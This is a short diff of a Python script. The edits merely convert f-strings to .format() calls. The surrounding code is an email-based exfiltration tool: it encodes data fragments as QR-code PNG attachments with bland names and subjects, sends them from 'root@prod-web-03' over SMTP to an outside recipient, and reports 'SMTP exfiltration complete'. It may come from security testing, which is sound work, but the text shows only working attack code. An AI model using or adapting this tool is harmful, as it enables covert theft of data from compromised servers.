@@ -37,14 +37,14 @@ def build_email(subject: str, recipient: str, qr_data: str, filename: str) -> st
     msg["From"] = "root@prod-web-03"
     msg["To"] = recipient
 
-    body = MIMEText(f"Please find the attached {subject.lower()} document.\n", "plain")
+    body = MIMEText("Please find the attached {} document.\n".format(subject.lower()), "plain")
     msg.attach(body)
 
     png_bytes = make_qr_png(qr_data)
     attachment = MIMEBase("image", "png", filename=filename)
     attachment.set_payload(png_bytes)
     encode_base64(attachment)
-    attachment.add_header("Content-Disposition", f"attachment; filename={filename}")
+    attachment.add_header("Content-Disposition", "attachment; filename={}".format(filename))
     msg.attach(attachment)
 
     return msg.as_string()
@@ -63,18 +63,18 @@ def main():
         ("Quarterly documentation", "IMG_1843.png", "92kL"),
     ]
 
-    print(f"[*] Connecting to SMTP server {args.smtp_host}:{args.smtp_port}")
+    print("[*] Connecting to SMTP server {}:{}".format(args.smtp_host, args.smtp_port))
 
     try:
         with smtplib.SMTP(args.smtp_host, args.smtp_port, timeout=30) as s:
             s.set_debuglevel(1)
             for subject, filename, qr_data in emails:
-                print(f"[*] Sending: {subject} ({filename})")
+                print("[*] Sending: {} ({})".format(subject, filename))
                 email_body = build_email(subject, args.recipient, qr_data, filename)
                 s.sendmail("root@prod-web-03", [args.recipient], email_body)
-                print(f"[+] Sent: {subject}")
+                print("[+] Sent: {}".format(subject))
     except Exception as e:
-        print(f"[-] SMTP error: {e}", file=sys.stderr)
+        print("[-] SMTP error: {}".format(e), file=sys.stderr)
         sys.exit(1)
 
     print("[+] SMTP exfiltration complete")
